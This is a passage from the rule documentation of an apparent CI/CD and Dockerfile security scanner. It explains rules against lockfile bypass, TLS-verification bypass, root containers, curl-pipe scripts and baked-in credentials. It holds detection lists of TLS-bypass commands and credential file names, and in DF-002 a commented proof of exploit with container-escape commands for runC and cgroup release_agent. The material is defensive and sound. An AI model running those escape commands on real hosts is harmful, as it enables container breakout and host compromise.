#### `CC-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-022 }

**Evidences:** [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`CC-022`](../providers/circleci.md#cc-022) in the [CircleCI provider](../providers/circleci.md).

#### `CC-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-023 }

**Evidences:** [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-023`](../providers/circleci.md#cc-023) in the [CircleCI provider](../providers/circleci.md).

#### `CD-001`: Automatic rollback on failure not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cd-001 }

**Evidences:** [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply.

**How this is detected.** Without ``autoRollbackConfiguration``, a CodeDeploy deployment that fails leaves the failed revision live until an operator notices. The default is opt-in, not opt-out, deployments fail-open, not fail-back.

**Recommendation.** Enable autoRollbackConfiguration with at least the DEPLOYMENT_FAILURE event so CodeDeploy automatically reverts to the last successful revision when a deployment fails.

**Source:** [`CD-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CD-002`: AllAtOnce deployment config, no canary or rolling strategy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cd-002 }

**Evidences:** [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply, [`5.2.1`](#ctrl-5-2-1) Ensure deployment environments are separated.

**How this is detected.** AllAtOnce shifts 100% of traffic to the new revision in one step. There's no gradient to halt on if a CloudWatch alarm trips mid-rollout, the bad revision is already serving every request. Canary / linear configs introduce the shift-then-watch shape that lets monitors catch a regression before it's universal.

**Recommendation.** Switch to a canary or linear deployment configuration (e.g. CodeDeployDefault.LambdaCanary10Percent5Minutes or a custom rolling config) so that defects are caught before they affect all instances or traffic.

**Source:** [`CD-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CD-003`: No CloudWatch alarm monitoring on deployment group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cd-003 }

**Evidences:** [`5.2.3`](#ctrl-5-2-3) Ensure deployment environment activity is audited.

**How this is detected.** Alarm-based rollback is what lets a canary configuration actually stop a bad deploy mid-flight. Without alarms wired into ``alarmConfiguration``, CodeDeploy's only signal that the deploy went wrong is the deployment-state machine itself, which doesn't notice an application-level regression. CD-002's canary work and this rule's alarm-based halt are paired.

**Recommendation.** Add CloudWatch alarms (e.g. error rate, 5xx count, latency p99) to the deployment group's alarmConfiguration. Enable automatic rollback on DEPLOYMENT_STOP_ON_ALARM to halt bad deployments.

**Source:** [`CD-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-001`: No approval action before deploy stages <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-001 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution, [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply.

**How this is detected.** A pipeline that goes Source -> Build -> Deploy with no Approval action means every commit on the source branch ships, with no human ack between code-merged and code-running-in-prod. The Manual approval action is the intentional pause point, combine with CP-005 for production-tagged stages specifically.

**Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.

**Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-002`: Artifact store not encrypted with customer-managed KMS key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-002 }

**Evidences:** [`2.4.2`](#ctrl-2-4-2) Ensure pipeline integrity, artifacts are signed by the pipeline, [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** The pipeline's S3 artifact store holds intermediate build outputs handed between stages. Default SSE-S3 (AES256) encrypts at rest but uses an AWS-owned key whose policy you can't scope. A customer-managed CMK gives the same key-policy + CloudTrail Decrypt-event audit story you'd apply to Lambda code, Secrets Manager, or any other build output.

**Recommendation.** Configure a customer-managed AWS KMS key as the encryptionKey for each artifact store. This enables key rotation, fine-grained access policies, and CloudTrail auditing of decrypt operations.

**Source:** [`CP-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-003`: Source stage using polling instead of event-driven trigger <span class="pg-sev pg-sev--low">LOW</span> { #detail-cp-003 }

**Evidences:** [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** ``PollForSourceChanges=true`` polls the source repo every minute or two. Beyond the API-quota and latency cost, polling produces a less-useful CloudTrail story than event-driven triggers. You see the poll calls, not the specific commit that started the pipeline. EventBridge / CodeCommit triggers tie each pipeline start to the originating event.

**Recommendation.** Set PollForSourceChanges=false and configure an Amazon EventBridge rule or CodeCommit trigger to start the pipeline on change. This reduces latency, API usage, and improves auditability.

**Known false positives.**

- ``PollForSourceChanges=true`` is the CFN default for CodeCommit sources, so legacy templates can carry the flag without an active design decision behind it. The rule is advisory (consider EventBridge / CodeStarSourceConnection) rather than a real risk; defaults to LOW confidence so CI gates default-filter it.

**Source:** [`CP-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-004`: Legacy ThirdParty/GitHub source action (OAuth token) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-004 }

**Evidences:** [`1.3.4`](#ctrl-1-3-4) Ensure organization identity is required for contribution (no long-lived personal tokens).

**How this is detected.** The legacy ThirdParty/GitHub source-action provider stores a long-lived OAuth token in the pipeline's action configuration. The token has whatever scope the granting GitHub user has, never rotates, and isn't directly revocable from the AWS side. CodeConnections (formerly CodeStar Connections) replaces this with an AWS-managed connection that the GitHub user can revoke.

**Recommendation.** Migrate to owner=AWS, provider=CodeStarSourceConnection and reference a CodeConnections connection ARN.

**Source:** [`CP-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `DF-001`: FROM image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Reuses ``_primitives/image_pinning.classify`` so the floating-tag semantics match GL-001 / JF-009 / ADO-009 / CC-003. ``PINNED_TAG`` (e.g. ``python:3.12.1-slim``) is treated as unpinned here too, only an explicit ``@sha256:`` survives, since the tag is mutable on the registry side.

**Recommendation.** Resolve every base image to its current digest (``docker buildx imagetools inspect <ref>`` prints it) and pin via ``FROM repo@sha256:<digest>``. Automate refreshes with Renovate or Dependabot. A floating tag (``:latest``, ``:3``, no tag) silently swaps the build base under every rebuild.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- Docker Hub typosquatting / namespace-takeover incidents (2017 onward): docker-library Sysdig and Aqua research documented thousands of malicious images uploaded under near-miss names (``alpine`` vs ``alphine``, etc.) and occasional namespace recoveries shipping crypto-miners downstream. Digest-pinned consumers are immune; tag-pinned consumers pull whatever sits under the name today.
- Codecov ``codecov/codecov-action`` tag-mutation incident (post-Codecov-Bash-uploader compromise): the upstream rotated the action's ``@v3`` tag during the fallout, and consumers pinning to the tag silently re-ran a different build than before. Digest pinning would have surfaced the change as a checksum mismatch instead of a silent swap.

**Source:** [`DF-001`](../providers/dockerfile.md#df-001) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-002`: Container runs as root (missing or root USER directive) <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Multi-stage builds: only the final stage matters for runtime identity, since intermediate stages don't ship. The check scopes USER to the *last* FROM through end-of-file.

**Recommendation.** Add a ``USER <non-root>`` directive after package install steps (e.g. ``USER 1001`` or ``USER appuser``). Running as root inside a container is not isolation, a kernel CVE, a misconfigured mount, or a mis-applied capability collapses straight into the host.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [CVE-2019-5736](https://www.cve.org/CVERecord?id=CVE-2019-5736) (runC host breakout): a malicious container running as root could overwrite the host's runC binary and compromise every other container on the node. Non-root containers were not exploitable.
- [CVE-2022-0492](https://www.cve.org/CVERecord?id=CVE-2022-0492) (cgroups v1 escape via release_agent): root inside a container with CAP_SYS_ADMIN could write to the host's release_agent file and execute arbitrary host code. Containers running as a non-root UID side-stepped the exploit class entirely.

**Proof of exploit.**

# Vulnerable: image runs as root by default (no USER set).
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3
COPY app.py /app/
CMD ["python3", "/app/app.py"]

# Attack: when the container is breached (RCE in the app, a
# kernel CVE, a misconfigured mount), the attacker runs as
# UID 0. From there:
#
#   # CVE-2019-5736 path: overwrite /proc/self/exe to corrupt
#   # the host's runC binary — every container on the node
#   # the next launch executes attacker code on the host:
#   echo '#!/bin/sh\n/attacker_payload' > /proc/self/exe
#
#   # CVE-2022-0492 path: cgroup release_agent escape:
#   mkdir /tmp/cg && mount -t cgroup -o memory cgroup /tmp/cg
#   echo '/payload' > /tmp/cg/release_agent
#   echo 1 > /tmp/cg/notify_on_release
#
# A non-root UID makes both paths fail at the first syscall.

# Safe: drop to a dedicated unprivileged user.
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3 \
  && useradd --uid 1001 --create-home app
COPY --chown=app:app app.py /app/
USER 1001
CMD ["python3", "/app/app.py"]

**Source:** [`DF-002`](../providers/dockerfile.md#df-002) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-003`: ADD pulls remote URL without integrity verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-003 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** ``ADD`` with a URL is the historical Dockerfile footgun: it fetches at *build* time over HTTP(S) with no checksum and no signature, and the registry tag does not pin the source. A tampered server or DNS hijack silently swaps the content. ``COPY`` is for local files; ``RUN curl + verify`` is for remote ones.

**Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.

**Known false positives.**

- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.

**Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Reuses ``_primitives/remote_script_exec.scan`` so the vocabulary matches the equivalent CI-side rules (GHA-016, GL-016, BB-012, ADO-016, CC-016, JF-016).

**Recommendation.** Download to a file, verify checksum or signature, then execute. ``curl -fsSL <url> -o /tmp/x.sh && sha256sum -c <(echo '<digest>  /tmp/x.sh') && bash /tmp/x.sh``. Vendor installers from well-known hosts (rustup.rs, get.docker.com, ...) are reported with vendor_trusted=true so reviewers can calibrate.

**Source:** [`DF-004`](../providers/dockerfile.md#df-004) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-005`: RUN uses shell-eval (eval / sh -c on a variable / backticks) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-005 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Reuses ``_primitives/shell_eval.scan``, same primitive used by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so the safe / unsafe vocabulary matches across the tool.

**Recommendation.** Replace ``eval "$X"`` and ``sh -c "$X"`` with explicit argv invocations. If the build genuinely needs a templated command, render it through a sealed config file or use ``RUN --mount=type=secret`` with explicit input. ``$( … )`` / backticks should never wrap interpolated user-controlled vars inside a Dockerfile.

**Source:** [`DF-005`](../providers/dockerfile.md#df-005) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-006`: ENV or ARG carries a credential-shaped literal value <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-006 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS keys outright (the literal AWS access-key shape) and credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal.

**Recommendation.** Never hard-code credentials in a Dockerfile. ``ENV`` values are baked into the image layer history, even if the value is later overwritten, ``docker history --no-trunc`` reads the original. Use ``RUN --mount=type=secret`` for build-time secrets or runtime env injection (``docker run -e SECRET=…``) for runtime ones. Rotate any secret already exposed.

**Source:** [`DF-006`](../providers/dockerfile.md#df-006) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-008`: RUN invokes docker --privileged or escalates capabilities <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-008 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Mirrors GHA-017 / GL-017 / BB-013 / ADO-017 / CC-017 / JF-017 (``docker run --privileged`` in CI scripts) but at Dockerfile build time. The risk is subtler: a privileged RUN step doesn't directly elevate the resulting image, but it gives the build host's docker daemon a chance to escape, and any tampered base image can exploit the elevated build.

**Recommendation.** A Dockerfile build step almost never legitimately needs ``--privileged`` or ``--cap-add SYS_ADMIN`` / ``ALL``. If the build genuinely requires elevated capabilities (e.g. compiling a kernel module), do it in a sealed builder image and ``COPY`` the artifact out, don't carry the privileged execution into the runtime image.

**Source:** [`DF-008`](../providers/dockerfile.md#df-008) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-010`: apt-get dist-upgrade / upgrade pulls unknown package versions <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-010 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified.

**How this is detected.** Running ``apt-get upgrade`` (or ``dist-upgrade``) inside a Dockerfile is the classic pet-vs-cattle anti-pattern. Two back-to-back builds with the same Dockerfile can produce different images because the upstream archive moved between the two ``RUN`` invocations. ``dist-upgrade`` additionally relaxes dependency resolution. It can install / remove arbitrary packages to satisfy upgrades, so the resulting image's package set isn't even bounded by what the Dockerfile declares.

**Recommendation.** Drop the upgrade step. Build on a recent base image instead (rebuild your image when the base image gets a security patch, pin the base by digest per DF-001 so the rebuild is deterministic). ``apt-get install pkg=<version>`` for specific packages stays reproducible; ``upgrade`` / ``dist-upgrade`` does not.

**Source:** [`DF-010`](../providers/dockerfile.md#df-010) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-011`: Package manager install without cache cleanup in same layer <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-011 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified.

**How this is detected.** Each Dockerfile ``RUN`` produces a layer. Installing packages in one layer and cleaning the cache in a later layer leaves the cache files in the lower layer forever, final image size is unchanged and the residual files broaden the attack surface (e.g. apt's signed-by keys, package metadata). The fix is layout, not behavior: do install + cleanup in the same ``RUN``.

**Recommendation.** Combine the install and cleanup into the same ``RUN`` so the cache lands in a single layer that gets discarded together. Idiomatic pattern: ``RUN apt-get update && apt-get install -y <pkgs> && rm -rf /var/lib/apt/lists/*``. Equivalent forms: ``apk add --no-cache <pkgs>``, ``dnf install -y … && dnf clean all``, ``yum install -y … && yum clean all``, ``zypper -n in … && zypper clean -a``.

**Source:** [`DF-011`](../providers/dockerfile.md#df-011) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-012`: RUN invokes sudo <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-012 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** ``sudo`` inside a Dockerfile is almost always a copy-paste from a host README. Its presence usually means one of three things, all of them wrong: (a) the build is silently running as root and the operator misread it, (b) the image carries an unrestricted ``sudoers`` line that a runtime escape can abuse, or (c) the package install chain depends on TTY-aware ``sudo`` behavior that breaks under non-TTY ``docker build``. None of these cases benefit from keeping the directive.

**Recommendation.** Drop ``sudo`` from the ``RUN``. Either the build is already running as root (the default before any ``USER`` directive), in which case ``sudo`` is no-op noise, or the build switched to a non-root ``USER`` and needs root for a specific step, in which case temporarily revert with ``USER root`` for that ``RUN`` and switch back afterward.

**Source:** [`DF-012`](../providers/dockerfile.md#df-012) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-013`: EXPOSE declares sensitive remote-access port <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-013 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.1.6`](#ctrl-2-1-6) Ensure build workers have minimal network connectivity.

**How this is detected.** ``EXPOSE`` is documentation, not a firewall. It doesn't actually open the port. But ``EXPOSE 22`` is a strong signal the image runs sshd, and any remote-access daemon inside the container blows up the threat model: now you have an extra auth surface, an extra service to keep patched, and a way for a compromised app to phone home from the outside. The container runtime / orchestrator's exec path covers every operational use case sshd traditionally served.

**Recommendation.** Remove the ``EXPOSE`` line for the remote-access port. If the operator legitimately needs to reach the container, exec into it (``docker exec`` / ``kubectl exec``). That path uses the orchestrator's auth and audit, doesn't open a network port, and doesn't ship an extra daemon inside the image. Containers should not run sshd / telnetd / ftpd / rsh-d / vncd / RDP alongside the application.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-013`](../providers/dockerfile.md#df-013) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-014`: WORKDIR set to a system / kernel filesystem path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-014 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Subsequent directives in the Dockerfile (``COPY src dest``, ``RUN`` writes, ``ADD …``) resolve relative paths against the active ``WORKDIR``. A ``WORKDIR /sys`` followed by ``COPY conf.txt config.txt`` writes into the kernel's sysfs surface, at best a build-time error, at worst a container-escape primitive that lets a compromised step manipulate cgroups, devices, or kernel config.

**Recommendation.** Move ``WORKDIR`` to a dedicated app directory (``/app``, ``/srv/app``, ``/opt/<service>``). System paths like ``/sys``, ``/proc``, ``/dev``, ``/etc``, ``/`` and the ``root`` home are not application directories, pointing the working dir at one means subsequent ``COPY`` / ``RUN`` writes target kernel-exposed namespaces or admin-only configuration.

**Source:** [`DF-014`](../providers/dockerfile.md#df-014) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-015`: RUN grants world-writable permissions (chmod 777 / a+w) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-015 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** World-writable directories under ``/`` are an established container-escape vector: any compromised process running as non-root can drop a payload that root-owned daemons later execute. The rule fires on the literal ``777``, ``a+w``, and ``a+rwx`` modes; the more conservative ``775`` and ``ugo+x`` are not flagged.

**Recommendation.** Replace ``chmod 777 <path>`` with the narrowest permissions the workload actually needs. ``chmod 755`` is enough for executables under a read-only root filesystem; ``640`` or ``600`` for files the runtime user reads. ``a+w`` is almost always copy-pasted from a SO answer and almost never the correct fix.

**Known false positives.**

- Test fixtures or scratch builds that intentionally share a directory across multiple non-root users may legitimately use ``777``. Suppress with an ignore-file entry rather than weakening the rule.

**Source:** [`DF-015`](../providers/dockerfile.md#df-015) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-016`: Image lacks OCI provenance labels <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-016 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** The OCI image-spec annotation set is a small de facto standard maintained by the OCI working group. Only ``image.source`` and ``image.revision`` are checked because they're the two whose absence makes incident response materially harder; ``image.title`` / ``image.description`` are nice-to-have but the rule doesn't fire on those.

**Recommendation.** Add a ``LABEL`` line carrying at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). Most registries surface those fields in the UI and on ``manifest inspect``, which closes the source-to-image gap that GHA-006 / SLSA Build-L2 provenance attestation also addresses.

**Known false positives.**

- A multi-stage build's intermediate stages don't need provenance labels, only the final image ships. The rule fires per Dockerfile, not per stage; suppress for files where the final ``FROM`` is intentional throwaway scratch.

**Source:** [`DF-016`](../providers/dockerfile.md#df-016) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-017`: ENV PATH prepends a world-writable directory <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-017 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** A writable PATH entry that comes before the system bins lets any process inside the container shadow ``ls``, ``ps``, ``apt-get``, ``cat``, etc. by dropping a binary of the same name into the writable dir. On a multi-tenant image, or any image where an exploit can reach the filesystem, this is a free privilege-escalation vector.

**Recommendation.** Don't put ``/tmp``, ``/var/tmp``, ``/dev/shm``, or any other world-writable path in ``PATH`` ahead of the system binary directories. Drop those entries entirely, or place them at the tail (``ENV PATH=/usr/bin:$PATH:/tmp``) so legitimate binaries always shadow anything dropped into the writable dir at runtime.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-017`](../providers/dockerfile.md#df-017) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-018`: RUN chown rewrites ownership of a system path <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-018 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Recognizes ``chown`` and ``chgrp`` invocations whose first non-flag path argument resolves under a system directory. The non-recursive case is also flagged because a single ``chown user /etc`` is just as harmful, the recursive flag matters for the size of the blast radius, not for whether it's wrong. Application paths under ``/opt``, ``/srv``, ``/var/lib/<app>``, and ``/app`` are not flagged.

**Recommendation.** Don't ``chown`` system directories at build time. If the runtime user needs to own a workload-specific subtree, ``COPY --chown=<user>:<group>`` it into the image at the subtree root, or place the workload under a dedicated directory (e.g. ``/app``, ``/srv/app``) and ``chown`` only that path. Granting the runtime user write access to ``/etc``, ``/usr``, ``/sbin``, or ``/lib`` lets a process exploit later steps to stage a binary the system trusts.

**Source:** [`DF-018`](../providers/dockerfile.md#df-018) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-019`: COPY/ADD source path looks like a credential file <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-019 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Fires on any ``COPY`` or ``ADD`` whose source basename is a well-known credential filename (``id_rsa``, ``.npmrc``, ``.netrc``, ``.env``, ``terraform.tfvars``, …) or whose path tail matches a canonical credential location (``.aws/credentials``, ``.docker/config.json``, ``.kube/config``). Files with private-key extensions (``.pem``, ``.key``, ``.p12``, ``.pfx``, ``.jks``) are also flagged. Globs are not expanded, the rule reads the literal source token.

**Recommendation.** Don't ``COPY`` credential files into an image. Anything baked into a layer is recoverable by anyone who can pull the image, even if a later step deletes the file. For build-time secrets (npm tokens, registry credentials, SSH deploy keys), use ``RUN --mount=type=secret,id=<name>`` so the value lives only for the duration of the step. For runtime secrets, mount them from the orchestrator (Kubernetes Secret, ECS task role, Vault sidecar) instead.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Empty placeholder files (``.env`` shipped as a template, ``config.json`` carrying only public flags). Suppress with a brief ``.pipelinecheckignore`` rationale and prefer an explicit non-secret name (``.env.example``).

**Source:** [`DF-019`](../providers/dockerfile.md#df-019) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-020`: ARG declares a credential-named build argument <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-020 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Complements DF-006 (which flags an ENV/ARG with a literal credential-shaped value). This rule fires on the *name* alone, ``ARG NPM_TOKEN``, ``ARG GITHUB_PAT``, ``ARG DB_PASSWORD``, even when no default is set, because BuildKit records the resolved value in the image's history the moment ``--build-arg`` supplies one. Names are matched via the same ``_primitives/secret_shapes`` regex used by the other secret-name rules.

**Recommendation.** Don't pass secrets through ``ARG``. Build arguments are recorded in ``docker history`` whether the value comes from a default or from ``--build-arg`` at build time, so a credential-named ARG leaks the secret to anyone who can pull the image. Use ``RUN --mount=type=secret,id=<name>`` and feed the value with BuildKit's ``--secret`` flag, the secret never lands in a layer or in the build history.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.

**Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).

#### `ECR-001`: Image scanning on push not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** scan-on-push runs a CVE check against the image's OS package layers at the moment it lands in ECR. Without it, an image with a known CVE deploys silently. The ECR basic scanner is free; ECR-007 covers the Inspector v2 enhanced scanner that adds language-ecosystem CVEs (npm, pip, gem).

**Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.

**Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked), [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Mutable tags mean ``:latest``, ``:v1.0``, and ``:stable`` can be re-pushed silently, the same tag points to different image content over time. Pinning by digest (``sha256:...``) in deployment manifests is the only durable reference; IMMUTABLE on the repo enforces the property registry-side so a forgotten digest reference doesn't drift.

